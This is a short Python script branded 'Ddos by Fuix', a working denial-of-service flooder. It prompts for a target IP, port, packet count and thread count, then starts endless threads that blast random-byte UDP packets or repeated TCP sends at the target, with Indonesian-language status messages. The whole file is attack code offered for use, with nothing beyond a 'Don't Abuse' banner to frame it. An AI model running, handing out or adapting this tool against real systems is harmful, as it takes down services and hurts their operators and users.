#!/usr/bin/env python3
#Ddos by Fuix
import random
import socket
import threading
import os

os.system("clear")

print("------------------------------------------------------------")
print(" »      Don't Abuse         «")
print(" »   TOOLS BY FUIX!       «")
print("------------------------------------------------------------")
ip = str(input(" DDoSAttackByFuix | Ip:"))
port = int(input(" DDoSAttackByFuix | Port:"))
choice = str(input(" DDoSAttackByFuix | Gas Gak Ni?(y/n):"))
times = int(input(" DDoSAttackByFuix | Packets:"))
threads = int(input(" DDoSAttackByFuix | Threads:"))
def run():
	data = random._urandom(1024)
	i = random.choice(("[*]","[!]","[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i +" Fuix Telah Datang ")
		except:
			print("[!] FUIX COMEBACK! ")

def run2():
	data = random._urandom(16)
	i = random.choice(("[*]","[!]","[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +" Fuix Telah Datang ")
		except:
			s.close()
			print("[*] FUIX COMEBACK! ")

for y in range(threads):
	if choice == 'y':
		th = threading.Thread(target = run)
		th.start()
	else:
		th = threading.Thread(target = run2)
		th.start()
